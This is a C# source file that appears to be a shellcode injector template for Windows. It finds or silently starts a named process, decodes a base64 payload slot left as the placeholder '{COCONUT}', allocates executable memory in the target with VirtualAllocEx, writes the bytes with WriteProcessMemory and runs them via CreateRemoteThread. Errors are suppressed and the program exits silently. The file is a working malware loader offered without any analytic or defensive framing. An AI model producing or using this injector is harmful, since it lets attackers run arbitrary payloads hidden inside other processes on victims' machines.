using System;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Test
{
    public class Program
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;


        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        static readonly string shellcode = "{COCONUT}";
        static void Main(string[] args)
        {
            // Set process to useable process
            Process[] pid = Process.GetProcessesByName("Process Name");
            if (pid.Length == 0)
            {
                try
                {
                    using (Process proc = new Process())
                    {
                        // If no processes, start one and get pid
                        proc.StartInfo.UseShellExecute = true;
                        proc.StartInfo.FileName = @"C:\Program Files (x86)\Process Path.exe";
                        proc.StartInfo.CreateNoWindow = true;
                        proc.Start();
                        Thread.Sleep(3000);
                        pid = Process.GetProcessesByName("Process Name");
                    }
                }
                catch
                {
                    Environment.Exit(1);
                }
            }

            try
            {
                Inject(shellcode, pid[0].Id);
            }
            catch
            {
                Environment.Exit(1);
            }

        }
        public static int Inject(string x64, int procPID)
        {
            Process targetProcess = Process.GetProcessById(procPID);
            byte[] shellcode = Convert.FromBase64String(x64);
            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);
            return 0;
        }
    }
}